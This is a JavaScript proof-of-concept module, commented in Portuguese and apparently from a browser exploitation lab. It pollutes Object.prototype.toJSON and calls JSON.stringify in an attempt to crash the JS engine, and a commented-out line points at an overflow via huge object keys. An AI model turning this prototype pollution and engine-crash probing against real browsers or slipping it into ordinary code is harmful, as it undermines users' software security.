// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs'; // Usando o log global
// Se AdvancedInt64 for necessário aqui, importe-o. Para este PoC, pode não ser.

const FNAME_BASE = "JsonExploitTest";

// Esta função é uma adaptação da sua testPPJsonHijackAndUseLeakS1
// Não depende mais do leakedValueFromOOB_S1, pois estamos focando no crash do JSON.stringify
export async function attemptJsonStringifyCrash() {
    appLog(`--- Iniciando ${FNAME_BASE}.attemptJsonStringifyCrash (Baseado no PoC v2.3) ---`, 'test', FNAME_BASE);

    const ppKey = 'toJSON';
    let originalToJSON_Descriptor; // Para restaurar corretamente
    let ppAppliedSuccessfully = false;
    let crashObserved = false;

    // Um objeto simples para ser serializado. O comportamento interessante
    // virá do 'this' dentro do toJSON poluído.
    const testObject = {
        data1: "test_data_alpha",
        data2: 12345,
        nested: {
            sub_data: true,
            another_val: "beta"
        }
    };

    try {
        originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        Object.prototype[ppKey] = function() {
            appLog(`===> Poluição Object.prototype.toJSON ATIVADA (acessando 'this') <===`, 'vuln', FNAME_BASE);
            let keysInfo = "N/A";
            try {
                const keys = Object.keys(this);
                keysInfo = `Keys count: ${keys.length}. First few: ${keys.slice(0,5).join(', ')}`;
                appLog(`   Dentro do toJSON - this: ${typeof this}, ${keysInfo}`, 'info', FNAME_BASE);
                // Retornar uma estrutura que represente o 'this' de alguma forma,
                // ou que possa ser grande o suficiente para interagir com o bug de stringLength * 6.
                // Para testar o bug de overflow diretamente (se as chaves forem muito grandes):
                // let largeKeyObject = {};
                // for(let i=0; i<10; i++) largeKeyObject["K".repeat(10000000) + i] = "val"; // Isso alocaria muita memória
                // return largeKeyObject;
                // Por agora, vamos retornar as chaves e um valor fixo.
                return {
                    "toJSON_executed": true,
                    "this_type": String(typeof this),
                    "object_keys_sample": keys.slice(0, 10) // Amostra das chaves
                };
            } catch (e) {
                appLog(`   ERRO ao tentar Object.keys(this) dentro do toJSON: ${e.message}`, 'error', FNAME_BASE);
                // Mesmo com erro, podemos tentar retornar algo para ver se o stringify externo ainda trava
                return { "toJSON_error_getting_keys": true, "error_message": String(e.message) };
            }
        };
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} aplicada (v2.3 adaptada).`, 'info', FNAME_BASE);
        appLog(`Tentando JSON.stringify com testObject... (Esta é a chamada que pode travar o navegador)`, 'critical', FNAME_BASE);
        
        // Forçar o navegador a renderizar o log antes da operação que pode crashar
        await PAUSE_LAB(100); 

        const result = JSON.stringify(testObject); // PONTO CRÍTICO

        // Se chegarmos aqui, não houve crash visível imediato
        appLog(`JSON.stringify CONCLUÍDO SEM CRASH VISÍVEL. Resultado: ${result.substring(0, 200)}...`, 'warn', FNAME_BASE);
        if (result && result.includes('"toJSON_executed":true')) {
            appLog("INFO: Poluição via Object.prototype.toJSON afetou JSON.stringify como esperado.", 'info', FNAME_BASE);
        }

    } catch (e) {
        appLog(`CRASH/ERRO CAPTURADO durante JSON.stringify: ${e.message}`, 'vuln', FNAME_BASE);
        console.error("JSON.stringify Crash Test Error:", e);
        appLog("CRASH OBSERVADO! Verifique o console do debugger do motor JS se possível.", 'critical', FNAME_BASE);
        crashObserved = true;
    } finally {
        if (ppAppliedSuccessfully) {
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
            } else {
                delete Object.prototype[ppKey]; // Se não existia antes
            }
            appLog(`Object.prototype.${ppKey} restaurado para o original (ou deletado).`, 'good', `${FNAME_BASE}.Cleanup`);
        }
    }
    appLog(`--- ${FNAME_BASE}.attemptJsonStringifyCrash Concluído (Crash Observado: ${crashObserved}) ---`, 'test', FNAME_BASE);
    if (crashObserved) {
        appLog("*********************************************************************", "vuln", FNAME_BASE);
        appLog("****** CRASH ACIONADO COM SUCESSO VIA JSON.STRINGIFY! ******", "vuln", FNAME_BASE);
        appLog("*********************************************************************", "vuln", FNAME_BASE);
    } else {
        appLog("Nenhum crash capturável ocorreu durante o teste JSON.stringify.", "warn", FNAME_BASE);
    }
    return crashObserved;
}
